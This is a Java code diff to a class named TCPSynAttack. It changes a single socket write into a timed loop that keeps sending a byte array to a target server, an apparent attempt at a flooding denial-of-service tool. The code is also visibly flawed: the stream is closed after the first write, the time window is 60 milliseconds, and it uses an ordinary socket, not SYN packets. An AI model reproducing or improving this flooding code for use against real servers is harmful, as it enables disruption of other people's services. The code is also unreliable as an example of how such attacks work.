@@ -5,6 +5,7 @@ import java.lang.Exception;
 import java.io.IOException;
 import java.nio.ByteBuffer;
 import java.net.Socket;
+import java.util.*;
 
 public class TCPSynAttack {
 
@@ -62,24 +63,30 @@ public class TCPSynAttack {
 		
 		System.out.println("Size: " + size);
 
-		while(timeToExit){
-			try(DataOutputStream sendToServer = new DataOutputStream(socket.getOutputStream()))
-	        {
-	        	sendToServer.write(arr, 0, size);
-	        }
-	        catch(IOException ex)
-	        {
-	            System.out.println("Cannot send packet");
-	        }
-	       	timeToExit = false;
-		}
+		long startTime = System.currentTimeMillis();
+		System.out.println("startTime: " + startTime);
 
-		try{
-			socket.close();
-		} catch(IOException ex){
-			System.out.println("Error closing the socket");
-		}
+		int sent = 0;
 
+		while(true){
+			long endTime = System.currentTimeMillis();
+			if(endTime - startTime < 60){
+				try(DataOutputStream sendToServer = new DataOutputStream(socket.getOutputStream()))
+		        {
+		        	sendToServer.write(arr, 0, size);
+		        	sent++;
+		        	System.out.println("Packt got sent");
+		        }
+		        catch(IOException ex)
+		        {
+		            System.out.println("Cannot send packet");
+		            System.exit(0);
+		        }
+		    }
+		    else{
+		    	System.exit(0);
+		    }
+		}
 	}
 
 
